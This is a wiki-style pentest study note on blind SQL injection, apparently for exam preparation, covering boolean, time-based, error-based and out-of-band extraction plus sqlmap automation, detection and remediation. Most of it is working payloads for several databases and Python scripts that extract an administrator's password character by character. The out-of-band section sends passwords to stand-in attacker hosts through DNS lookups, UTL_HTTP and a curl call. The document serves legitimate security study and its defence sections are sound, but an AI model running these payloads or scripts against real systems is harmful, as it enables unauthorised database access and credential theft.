---
title: Blind SQL injection techniques
slug: blind-sqli-techniques
aliases: [blind-sqli, boolean-sqli, time-based-sqli, error-based-sqli, oob-sqli]
---

> **TL;DR:** When injection output isn't directly visible, extract data bit-by-bit through boolean responses, deliberate time delays, forced database errors, or out-of-band DNS/HTTP exfiltration — the same data, just slower.

## What it is
Blind SQL injection exists when the application is vulnerable to SQLi but doesn't display query results or database errors in its HTTP responses. The attacker infers data by asking yes/no questions (boolean-based), measuring response time (time-based), triggering distinguishable error states (error-based), or causing the database to make outbound network connections carrying the data (out-of-band). OSWE source review identifies the injection point; the exam expects you to write a working extraction script.

## Preconditions / where it applies
- SQL injection exists but results aren't reflected in the response body (e.g., login form, tracking cookie, API filter).
- Boolean-based: the application returns a distinguishable difference (content, status code, redirect) for true vs. false conditions.
- Time-based: the database supports sleep/delay functions and the application doesn't have a shorter timeout.
- Error-based: verbose error messages or distinguishable 500 vs. 200 responses.
- OOB: the database server can make outbound DNS or HTTP requests (not firewalled egress).

## Technique

### 1 — Boolean-based blind

Inject a condition that changes the response:

```sql
-- Oracle
' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a'--

-- MySQL
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin' LIMIT 1)='a'-- -

-- PostgreSQL
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

-- MSSQL
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

Binary search on each character to reduce requests from 95 per position to ~7:

```python
import requests

URL = "https://target/filter"
COOKIES = {"TrackingId": ""}
TRUE_MARKER = "Welcome back"

def inject(payload):
    cookies = {"TrackingId": f"abc' AND ({payload})-- -", "session": "..."}
    r = requests.get(URL, cookies=cookies)
    return TRUE_MARKER in r.text

def extract_char(pos):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        # ASCII comparison: is the char > mid?
        if inject(f"SELECT ASCII(SUBSTRING(password,{pos},1)) FROM users WHERE username='administrator') > {mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low)

password = ""
for i in range(1, 33):  # assume 32-char hash
    password += extract_char(i)
    print(f"[{i}] {password}")
```

### 2 — Time-based blind

When there's no observable content difference — use conditional delays:

```sql
-- MySQL
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(3), 0)-- -
' AND (SELECT SLEEP(3) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')-- -

-- PostgreSQL
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='admin'--

-- MSSQL
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '0:0:3'--

-- Oracle
' AND CASE WHEN (SUBSTR(password,1,1)='a') THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ELSE 1 END FROM dual--

-- SQLite
' AND CASE WHEN (SUBSTR(password,1,1)='a') THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 0 END--
```

Script with timing threshold:

```python
import requests, time

def inject_time(payload, threshold=2.5):
    cookies = {"TrackingId": f"abc' AND ({payload})-- -"}
    start = time.time()
    requests.get(URL, cookies=cookies)
    return (time.time() - start) > threshold

def extract_char_time(pos):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"SELECT CASE WHEN ASCII(SUBSTRING(password,{pos},1))>{mid} THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator'"
        if inject_time(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low)
```

### 3 — Error-based extraction

Force the database to embed data in an error message:

```sql
-- MySQL (EXTRACTVALUE / UPDATEXML)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))-- -
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)), 1)-- -
-- Error: "XPATH syntax error: '~s3cr3tP@ssw0rd'"

-- MySQL (double query / subquery error)
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users LIMIT 1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- -

-- PostgreSQL (CAST error)
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--
-- Error: "invalid input syntax for integer: 's3cr3tP@ssw0rd'"

-- MSSQL (CONVERT error)
' AND 1=CONVERT(INT, (SELECT TOP 1 password FROM users))--
-- Error: "Conversion failed when converting the nvarchar value 's3cr3tP@ssw0rd'"

-- Oracle (UTL_INADDR / CTXSYS)
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1))--
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT password FROM users WHERE ROWNUM=1))--
```

Conditional error for boolean-style extraction when errors aren't reflected:

```sql
-- Trigger a division-by-zero only when the condition is true
' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users WHERE username='admin')=1--
-- 500 = true, 200 = false
```

### 4 — Out-of-band (OOB) exfiltration

When the database can make outbound network connections:

```sql
-- MySQL (requires FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\share'))-- -
-- DNS lookup: s3cr3tP@ssw0rd.attacker.com

-- MSSQL (xp_dirtree for DNS)
'; DECLARE @d VARCHAR(1024); SELECT @d=(SELECT TOP 1 password FROM users); EXEC master..xp_dirtree '\\' + @d + '.attacker.burpcollaborator.net\x'--

-- MSSQL (xp_fileexist)
'; DECLARE @d VARCHAR(1024); SET @d=(SELECT TOP 1 password FROM users); EXEC xp_fileexist '\\' + @d + '.evil.com\x'--

-- Oracle (UTL_HTTP)
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual--

-- Oracle (UTL_INADDR — DNS only)
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM dual--

-- PostgreSQL (COPY to program + curl)
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/?d=$(cat)'--

-- PostgreSQL (dblink)
'; SELECT dblink_connect('host='||(SELECT password FROM users)||'.attacker.com dbname=x')--
```

Use Burp Collaborator or interactsh to catch callbacks:

```bash
# interactsh — free OOB listener
interactsh-client -v
# Use the generated subdomain in payloads
```

### 5 — Automation with sqlmap

```bash
# Boolean-based on a cookie parameter
sqlmap -u "https://target/" --cookie="TrackingId=abc*" --level=2 \
  --technique=B --string="Welcome back" --dbms=PostgreSQL -D public -T users -C password --dump

# Time-based
sqlmap -u "https://target/" --cookie="TrackingId=abc*" --level=2 \
  --technique=T --time-sec=3 --dbms=PostgreSQL

# OOB with Collaborator
sqlmap -u "https://target/" --cookie="TrackingId=abc*" \
  --technique=O --dns-domain=xxx.burpcollaborator.net

# Dump specific data
sqlmap -u "https://target/" --cookie="TrackingId=abc*" \
  --sql-query="SELECT password FROM users WHERE username='administrator'"
```

### 6 — Length detection and table enumeration

Before extracting, determine the data length:

```sql
-- Length of password
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32--

-- Count rows
' AND (SELECT COUNT(*) FROM users)>5--

-- Table enumeration (MySQL)
' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)>5--
```

## Detection / blue-team
- WAF rules on `SLEEP`, `BENCHMARK`, `WAITFOR`, `pg_sleep`, `DBMS_PIPE`, `UTL_HTTP`, `LOAD_FILE`, `xp_dirtree` in request parameters.
- Response-time anomalies: requests to the same endpoint suddenly taking 3-10s are a strong signal.
- DNS query logging: internal database servers making DNS queries to unusual domains.
- Database audit logs: conditional queries with `SUBSTRING`, `ASCII`, `CASE WHEN` patterns that iterate.

## Remediation
- Parameterized queries / prepared statements — eliminates the injection entirely.
- Least-privilege database user: no `FILE` privilege (MySQL), no `xp_cmdshell` (MSSQL), no `UTL_HTTP` grants (Oracle).
- Egress filtering: database servers should not make outbound DNS or HTTP to the internet.
- Generic error pages: never expose database error messages to the user.
- WAF as defense-in-depth, not primary control.

## References
- [PortSwigger — Blind SQLi](https://portswigger.net/web-security/sql-injection/blind) — lab series covering all variants
- [PayloadsAllTheThings — Blind SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) — comprehensive payload lists
- [sqlmap documentation](https://sqlmap.org/) — automation flags

See also: [[sql-injection]], [[sql-injection-by-database]], [[postgresql-exploitation]], [[database-rce-from-sqli]], [[oast-out-of-band-testing]], [[waf-bypass]]
